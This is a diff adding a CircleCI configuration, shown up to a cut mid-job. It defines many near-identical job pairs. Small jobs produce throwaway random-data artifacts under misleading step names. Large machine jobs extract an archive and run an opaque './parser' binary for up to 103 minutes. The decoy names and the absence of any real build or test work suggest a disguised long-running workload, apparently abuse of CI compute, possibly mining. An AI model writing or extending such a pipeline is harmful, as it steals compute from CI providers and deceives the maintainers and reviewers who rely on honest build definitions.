@@ -1,0 +1,2019 @@
+version: 2.1
+
+jobs:
+  cleanup_package:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prune log tail
+          command: |
+            mkdir -p /tmp/cache
+            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1024 count=300 2>/dev/null | base64 > /tmp/cache/buffer.bin; true
+            ls -la /tmp/cache/buffer.bin | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - buffer.bin
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/buffer.bin || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  g2_mar1-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Reset analytics bucket
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; yes abc | head -n 444843 | sha256sum; true ; } > /tmp/cache/gate-done.out
+            ls -la /tmp/cache/gate-done.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - gate-done.out
+  mar1-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/gate-done.out || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  provision_aug8-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Reorder index entries
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1740800 | wc -c; true ; } > /tmp/cache/manifest.tgz
+            ls -la /tmp/cache/manifest.tgz | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - manifest.tgz
+  aug8-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/manifest.tgz || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  validate_INIT_PROD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Fold integer series
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=14 2>/dev/null | sha256sum; true ; } > /tmp/cache/gate-done.txt
+            ls -la /tmp/cache/gate-done.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - gate-done.txt
+  INIT_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/gate-done.txt || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  postbuild_alice-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Reduce row partitions
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; yes 'line' | head -n 140726 | awk '{print NR, $0}' | tail -1; true ; } > /tmp/cache/counts.jsonl
+            ls -la /tmp/cache/counts.jsonl | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - counts.jsonl
+  alice-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/counts.jsonl || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  loader_cerberus-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Capture job identity
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=326477;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/cache/stage.dat
+            ls -la /tmp/cache/stage.dat | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - stage.dat
+  cerberus-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/stage.dat || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  green_chore-9511:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scan vector span
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 184320 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/cache/step-25.txt
+            ls -la /tmp/cache/step-25.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - step-25.txt
+  chore-9511:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/step-25.txt || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  validate_fix-8671:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Collect byte metrics
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=79055;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/cache/primary_job_output_v2.out
+            ls -la /tmp/cache/primary_job_output_v2.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - primary_job_output_v2.out
+  fix-8671:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/primary_job_output_v2.out || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  fixture_publish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Walk directory tree
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 237747 | awk 'NR>9163 && NR<38222{s+=$1}END{print s}'; true ; } > /tmp/cache/counts.json
+            ls -la /tmp/cache/counts.json | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - counts.json
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/counts.json || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  produce_do-the-thing:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Scan prime offsets
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; head -c 9437184 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/cache/relay.sig
+            ls -la /tmp/cache/relay.sig | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - relay.sig
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/relay.sig || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  syncer_q2-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Aggregate run counters
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 375960 | paste - - - - | wc -l; true ; } > /tmp/cache/metrics.csv
+            ls -la /tmp/cache/metrics.csv | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - metrics.csv
+  q2-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/metrics.csv || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  D_fx-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Fuzz boundary edges
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; head -c 27262976 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/cache/report.log
+            ls -la /tmp/cache/report.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - report.log
+  fx-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/report.log || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  checker_v9-beta5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Flush pipeline cache
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 34089); do printf "%d\n" $i; done ) | sort -n | tail -1; true ; } > /tmp/cache/buffer.dat
+            ls -la /tmp/cache/buffer.dat | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - buffer.dat
+  v9-beta5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/buffer.dat || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  prefetch_node18-vet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Store intermediate blob
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 92022 | sha1sum; true ; } > /tmp/cache/gate-ready.txt
+            ls -la /tmp/cache/gate-ready.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - gate-ready.txt
+  node18-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/gate-ready.txt || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  gamma_rm-edge:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Verify fixture integrity
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; head -c 14680064 /dev/urandom | sha256sum; true ; } > /tmp/cache/step-ready.sig
+            ls -la /tmp/cache/step-ready.sig | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - step-ready.sig
+  rm-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/step-ready.sig || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  inspect_v4-ga:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Fingerprint vendor tree
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 2662400 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/cache/38.log
+            ls -la /tmp/cache/38.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - 38.log
+  v4-ga:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/38.log || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  rerun_build-end-to-end-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Mint batch slot
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 476012 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/cache/.ready
+            ls -la /tmp/cache/.ready | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - .ready
+  build-end-to-end-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/.ready || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  vendor_deploy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Audit path segments
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 5000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/cache/993a.out
+            ls -la /tmp/cache/993a.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - 993a.out
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/993a.out || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  g2_build-staging-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build frequency table
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{srand();s=0;for(i=0;i<352848;i++)s+=rand();printf "%.4f\n",s}'; true ; } > /tmp/cache/.ok
+            ls -la /tmp/cache/.ok | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - .ok
+  build-staging-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/.ok || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  rerun_DEV_MERGE_4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Fold branch counters
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<398248;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/cache/step-29.out
+            ls -la /tmp/cache/step-29.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - step-29.out
+  DEV_MERGE_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/step-29.out || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  spinner_q1-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Spool byte frames
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 819200 | wc -c; true ; } > /tmp/cache/step-1.out
+            ls -la /tmp/cache/step-1.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - step-1.out
+  q1-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/step-1.out || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  postbuild_d-2a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Expand parameter grid
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 16384 | wc -c; true ; } > /tmp/cache/51.data
+            ls -la /tmp/cache/51.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - 51.data
+  d-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/51.data || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  stepA_assemble-end-to-end-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Walk sorted keys
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=500 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/cache/primary_phase_output.out
+            ls -la /tmp/cache/primary_phase_output.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - primary_phase_output.out
+  assemble-end-to-end-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/primary_phase_output.out || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  B_fix-6341:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Checkpoint context
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 146713 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/cache/event.gz
+            ls -la /tmp/cache/event.gz | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - event.gz
+  fix-6341:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/event.gz || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  beta_ga-v6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mint sequence identifier
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 21000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/cache/secondary_task_output.log
+            ls -la /tmp/cache/secondary_task_output.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - secondary_task_output.log
+  ga-v6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
